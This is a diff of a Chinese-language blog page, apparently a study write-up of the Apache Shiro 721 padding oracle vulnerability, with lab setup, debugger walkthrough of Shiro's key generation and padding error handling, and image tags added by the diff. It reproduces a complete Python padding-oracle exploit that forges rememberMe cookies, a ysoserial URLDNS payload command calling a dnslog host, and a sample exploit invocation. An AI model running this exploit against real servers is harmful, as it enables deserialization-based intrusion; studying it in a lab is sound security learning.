@@ -294,14 +294,14 @@
 <span id="more"></span>
 <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本来早该学习的洞，一直拖着了，拖到了现在，发现面试必考，还是想着早补早安心。</p>
 <p>在 Shiro550 漏洞中，Cookie 所使用的 AES 加密密钥为硬编码，所以我们可以构造恶意序列化数据并使用固定的 AES 密钥进行正确加密恶意序列发送给服务端，进而达到攻击的目的。但在该漏洞公布后，Shiro 官方修复了这一漏洞，将AES密钥修改成了动态生成。也就是说，对于每一个 Cookie，都是使用不同的密钥进行加解密的。</p>
-<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>先下载对应的 jar 包 <a class="link"   target="_blank" rel="noopener" href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war" >samples-web-1.4.1.war<i class="fas fa-external-link-alt"></i></a>，将 jar 包里面的内容解压一下，<code>samples-web-1.4.1\WEB-INF\lib</code> 中的 <code>CommonsCollections</code> 包版本修改为 3.2.1 </p>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>先下载对应的 jar 包 <a class="link" target="_blank" rel="noopener" href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war">samples-web-1.4.1.war<i class="fas fa-external-link-alt"></i></a>，将 jar 包里面的内容解压一下，<code>samples-web-1.4.1\WEB-INF\lib</code> 中的 <code>CommonsCollections</code> 包版本修改为 3.2.1 </p>
 <p>接着新建项目包，选中 <code>web-app</code> 的 maven arch，将 samples-web-1.4.1 的包解压，放到 <code>webapp</code> 文件夹中，项目结构如图</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/structure.png" class>
 
 <p>再把 <code>WEB-INF\lib</code> 加入 project structure 中</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/libAdd.png" class>
 
-
-<p>之后再配 Tomcat 即可，如果不想自己搭建环境的话可以用我现成的环境<a class="link"   target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/shiro721" >https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/shiro721<i class="fas fa-external-link-alt"></i></a></p>
+<p>之后再配 Tomcat 即可，如果不想自己搭建环境的话可以用我现成的环境<a class="link" target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/shiro721">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/shiro721<i class="fas fa-external-link-alt"></i></a></p>
 <h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="漏洞利用前提条件"><a href="#漏洞利用前提条件" class="headerlink" title="漏洞利用前提条件"></a>漏洞利用前提条件</h3><p>漏洞影响版本是 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1</p>
 <p>Apache Shiro Padding Oracle Attack 的漏洞利用必须满足如下前提条件：</p>
 <ul>
@@ -311,15 +311,15 @@
 <li>密文可控；</li>
 </ul>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先正常登录进去，勾选上 rememberMe 选项：</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/login.png" class>
 
 <p>刷新当前页面或访问 <code>/account</code> 页面，获取此时登录成功的 rememberMe 值：</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/accountRememberMe.png" class>
 
 <p>使用 ysoserial 工具生成 URLDNS 验证 payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-6eca5bc740-1.jar URLDNS &quot;http://5zfnof.dnslog.cn&quot; &gt; payload.class</span><br></pre></td></tr></table></figure>
 
-<p>利用<a class="link"   target="_blank" rel="noopener" href="https://github.com/3ndz/Shiro-721" >GitHub的exp<i class="fas fa-external-link-alt"></i></a>来进行 Padding Oracle Attack：</p>
+<p>利用<a class="link" target="_blank" rel="noopener" href="https://github.com/3ndz/Shiro-721">GitHub的exp<i class="fas fa-external-link-alt"></i></a>来进行 Padding Oracle Attack：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/3ndz/Shiro-721  </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">from</span> paddingoracle <span class="keyword">import</span> BadPaddingException, PaddingOracle  </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode  </span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote, unquote  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PadBuster</span>(<span class="title class_ inherited__">PaddingOracle</span>):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):  </span><br><span class="line">        <span class="built_in">super</span>(PadBuster, self).__init__(**kwargs)  </span><br><span class="line">        self.session = requests.Session()  </span><br><span class="line">        self.wait = kwargs.get(<span class="string">&#x27;wait&#x27;</span>, <span class="number">2.0</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, data, **kwargs</span>):  </span><br><span class="line">        somecookie = b64encode(b64decode(unquote(sys.argv[<span class="number">2</span>])) + data)  </span><br><span class="line">        self.session.cookies[<span class="string">&#x27;rememberMe&#x27;</span>] = somecookie  </span><br><span class="line">        <span class="keyword">if</span> self.session.cookies.get(<span class="string">&#x27;JSESSIONID&#x27;</span>):  </span><br><span class="line">            <span class="keyword">del</span> self.session.cookies[<span class="string">&#x27;JSESSIONID&#x27;</span>]  </span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                response = self.session.get(sys.argv[<span class="number">1</span>],  </span><br><span class="line">                        stream=<span class="literal">False</span>, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">            <span class="keyword">except</span> (socket.error, requests.exceptions.RequestException):  </span><br><span class="line">                logging.exception(<span class="string">&#x27;Retrying request in %.2f seconds...&#x27;</span>,  </span><br><span class="line">                                  self.wait)  </span><br><span class="line">                time.sleep(self.wait)  </span><br><span class="line">                <span class="keyword">continue</span>  </span><br><span class="line">  </span><br><span class="line">        self.history.append(response)  </span><br><span class="line">        <span class="keyword">if</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="string">&#x27;deleteMe&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>):  </span><br><span class="line">            logging.debug(<span class="string">&#x27;No padding exception raised on %r&#x27;</span>, somecookie)  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">        <span class="keyword">raise</span> BadPaddingException  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="keyword">import</span> logging  </span><br><span class="line">    <span class="keyword">import</span> sys  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.argv[<span class="number">3</span>:]:  </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27;</span> % (sys.argv[<span class="number">0</span>], )  </span><br><span class="line">        sys.exit(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">    logging.basicConfig(level=logging.DEBUG)  </span><br><span class="line">    encrypted_cookie = b64decode(unquote(sys.argv[<span class="number">2</span>]))  </span><br><span class="line">    padbuster = PadBuster()  </span><br><span class="line">    payload = <span class="built_in">open</span>(sys.argv[<span class="number">3</span>], <span class="string">&#x27;rb&#x27;</span>).read()  </span><br><span class="line">    enc = padbuster.encrypt(plaintext=payload, block_size=<span class="number">16</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rememberMe cookies:&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(b64encode(enc))</span><br></pre></td></tr></table></figure>
 
 <p>安装脚本不需要 <code>pip install paddingoracle</code>，直接将 GitHub 项目的 <code>paddingoracle.py</code> 放到同目录即可。</p>
@@ -327,15 +327,15 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp.py http://192.168.5.3:8081/shiro721_war/account /COGnLcSO/3cUooGdYVDkQQNHrfZTNY+k0BCXPOmA9L+l7MRr3ZRYyuzDWZPNTSUFmFlkZWG+HJcecRLkdAMuxa43+i/hynQP7cYrDiulXmfTbuKmL8oz9DO9pmpUaumyCU0V3xfyLsv0+o3uYK/8Tlh9Ns+TMng3lMenVclDk3pjL/tPL/gfVFz50SMZw67WgdbG4mBzq0URLXG6d9yqB469ruPeKty5q3yjSfWDvOxJcR2OpUJg6dauiJNqwQwsu3FrkPmUlEAwZtQ/EpS9+74Ey5YVNuq350U00Df4ckmmHURCdRi/847d2dSHNQ80Wsoe4IseBOXabm6CBs+mcb4PWptM//E7CDaY6/UwTOm5yzK8/KSa+RNSXhHkOx4CH9wOyh8peq8bexGtoI1CzkqK54QwFkOzCu/bE9VPDU7ylZil3Xlc5oTDy79BHAZXfOgbUcgSSoV6OoOVG1DC6o6ptRYlFT0KBNjwS+ivFtbbA7kxf2Fq9K4tqxC2QI3 payload.class</span><br></pre></td></tr></table></figure>
 
 <p>最终运行成功会给我们一个 rememberMe cookie 去打</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/PayloadProduce.png" class>
 
 <p>这里我们将爆破生成的 cookie 替换进原本 <code>/account</code> 界面的 cookie 中去，发包，成功打到 DNS</p>
-<p>当然也可以使用现成的工具 <a class="link"   target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated" >ShiroExploit.V2.51<i class="fas fa-external-link-alt"></i></a>，输入测试网址以及登录用户的 Cookie</p>
+<p>当然也可以使用现成的工具 <a class="link" target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">ShiroExploit.V2.51<i class="fas fa-external-link-alt"></i></a>，输入测试网址以及登录用户的 Cookie</p>
 <h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><blockquote>
-<p>这里相关原理可以看鸿哥写的文章 ———— <a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/archives/217" >https://goodapple.top/archives/217<i class="fas fa-external-link-alt"></i></a><br>我对于漏洞的分析就直接在这基础之上总结一下</p>
+<p>这里相关原理可以看鸿哥写的文章 ———— <a class="link" target="_blank" rel="noopener" href="https://goodapple.top/archives/217">https://goodapple.top/archives/217<i class="fas fa-external-link-alt"></i></a><br>我对于漏洞的分析就直接在这基础之上总结一下</p>
 </blockquote>
 <h3 id="Padding-Oracle-Attack-构造加密数据分析"><a href="#Padding-Oracle-Attack-构造加密数据分析" class="headerlink" title="Padding Oracle Attack 构造加密数据分析"></a>Padding Oracle Attack 构造加密数据分析</h3><p>网上讲的文章大多数都是讲的如何使用 Padding Oracle Attack 来获取明文。但是这种场景在 Apache Shiro Padding Oracle Attack 这个漏洞场景中就不适用了。在这个场景中，我们需要构造恶意加密数据，进行解密后反序列化。</p>
-<p>此处内容参考自 <a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89" >https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89<i class="fas fa-external-link-alt"></i></a></p>
+<p>此处内容参考自 <a class="link" target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89">https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89<i class="fas fa-external-link-alt"></i></a></p>
 <p>这里简单说下 Padding Oracle Attack 加密数据整体过程：</p>
 <ol>
 <li>选择一个明文 <code>P</code>，用来生成你想要的密文<code>C</code>；</li>
@@ -357,24 +357,24 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = cipherService;</span><br><span class="line">        setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们可以跟进调试一下，断点下在 <code>org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</code> 下，shiro 通过 <code>generateNewKey()</code> 方法获取密钥，跟进</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/generateNewKey.png" class>
 
 <p>这里获取到了一个随机数生成器 <code>SecureRandom</code>， 跟进 <code>init()</code></p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/init.png" class>
 
 <p>往下看，这里 var4 是 <code>AESKeyGenerator</code>，跟进 <code>engineInit()</code> 方法，进行了 AES 算法的初始化。</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/engineInit.png" class>
 
-
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/engineInitAG.png" class>
 
 <p>回到 <code>org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</code>，跟进 <code>generateKey()</code> 方法</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/generateKey.png" class>
 
 <p>这里需要手动在 <code>com.sun.crypto.provider.AESKeyGenerator#engineGenerateKey()</code> 方法下个断点，不然不会停在这里。</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/engineGenerateKey.png" class>
 
 <p>可见这里已经生成了一串16字节的随机序列，并且返回一个 <code>SecretKeySpec</code> 对象，再使用<code>getEncoded()</code> 方法获取 <code>key</code> 密钥序列。</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/SecretKeySpec.png" class>
 
 <p>至此就是 Shiro721 完整的密钥生成过程。</p>
 <h4 id="在-shiro721-中的-Padding-Oracle-Attack"><a href="#在-shiro721-中的-Padding-Oracle-Attack" class="headerlink" title="在 shiro721 中的 Padding Oracle Attack"></a>在 shiro721 中的 Padding Oracle Attack</h4><p>要成功进行 Padding Oracle Attack 是需要服务端返回两个不同的响应特征来进行 Bool 判断的。</p>
@@ -385,33 +385,33 @@
 </ul>
 <p>我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的 Cookie，Shiro 是怎么处理的呢？</p>
 <h5 id="Padding-错误处理"><a href="#Padding-错误处理" class="headerlink" title="Padding 错误处理"></a>Padding 错误处理</h5><p>解密函数在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt()</code> 中</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/decrypt.png" class>
 
 <p>跟进 <code>cipherService.decrypt()</code>，最后到 <code>crypt()</code> 中调用 <code>doFinal()</code> 方法</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/crypt.png" class>
 
-
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/doFinal.png" class>
 
 <p><code>doFinal()</code> 方法有 <code>IllegalBlockSizeException</code>和<code>BadPaddingException</code> 这两个异常，分别用于捕获块大小异常和填充错误异常。异常会被抛出到 <code>crypt()</code> 方法中，最终被 <code>getRememberedPrincipals()</code> 方法捕获，并执行 <code>onRememberedPrincipalFailure()</code> 方法。</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/onRememberedPrincipalFailure.png" class>
 
 <p><code>onRememberedPrincipalFailure()</code> 方法调用了 <code>forgetIdentity()</code>。在 Shiro550 中我们分析过，该方法会调用 <code>removeFrom()</code>，并且会在response头部添加字段 <code>Set-Cookie: rememberMe=deleteMe</code></p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/forgetIdentity.png" class>
 
 <p>倘若Padding结果不正确的话，响应包就会返回 <code>Set-Cookie: rememberMe=deleteMe</code> 。</p>
 <h5 id="Padding正确，反序列化处理"><a href="#Padding正确，反序列化处理" class="headerlink" title="Padding正确，反序列化处理"></a>Padding正确，反序列化处理</h5><p>CBC模式下的分组密码，如果某一组的密文被破坏，那么在其之后的分组都会受到影响。这时候我们的密文就无法正确的被反序列化了。</p>
 <p>Shiro中关于反序列化的处理在 <code>org.apache.shiro.io.DefaultSerializer#deserialize()</code> 方法下</p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/deserialize.png" class>
 
 <p>如果反序列化的结果错误，则会抛出异常。最后异常仍会被 <code>getRememberedPrincipals()</code> 方法处理。这也就是上面讲的 response 包里会回显 302 且 <code>rememberMe=deleteMe</code></p>
 <p>但是对于 Java 来说，反序列化是以 Stream 的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化。我们可以来测试一下。</p>
 <p>我们获取正常用户的 Cookie 并使用密钥解密，可以看到最后填充的数据为 <code>0x0B</code></p>
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/addTails.png" class>
 
 <p>下面我们将其更改为其他合法填充方式，然后加密发送出去</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/changingPaddings.png" class>
 
-
-
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/SendDecrypt.png" class>
 
 <p>服务器端正常响应，于是这里就构造出了布尔条件</p>
 <ul>
@@ -419,7 +419,7 @@
 <li>Padding 错误，服务器返回 <code>Set-Cookie: rememberMe=deleteMe</code></li>
 </ul>
 <h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>感觉从利用上来说并不算是一个很好打的漏洞，不过还是拓展了一条 CBC 攻击的路线。</p>
-<h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/" >https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/archives/261" >https://goodapple.top/archives/261<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/">https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://goodapple.top/archives/261">https://goodapple.top/archives/261<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
